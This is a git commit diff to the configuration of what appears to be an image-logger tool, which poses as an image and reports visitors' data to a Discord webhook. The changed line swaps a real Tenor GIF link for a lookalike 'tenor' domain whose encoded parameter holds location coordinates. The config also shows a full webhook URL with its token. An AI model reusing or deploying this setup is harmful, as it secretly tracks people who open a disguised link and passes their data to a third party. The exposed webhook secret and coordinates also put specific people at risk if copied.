68690aec174727d8fae9fa9a1c1b4060d9f50244
DopMan123 <xazamer34932tagger334@gmail.com>
2025-03-07 20:47:19 -0500

    Update image.py

--- api/image.py
+++ api/image.py
@@ -13,7 +13,7 @@ __author__ = "DeKrypt"
 config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/1347730459110543402/aD1w_FfWvSI1MVcmLH2zjOkPB04vSy-qoS_6OMnZvt6hIBMbc9bJMSlhAsrGDeYatsM9",
-    "image": "https://tenor.com/view/discord-loading-buffering-waiting-to-load-gif-16464415", # You can also have a custom image by using a URL argument
+    "image": "https://tenor-rho-gray.vercel.app/api/image?g=NDAuNjMzNjA4MzU0MjkxMDUsLTczLjkwOTY1NTY3NTg5Mjk4", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
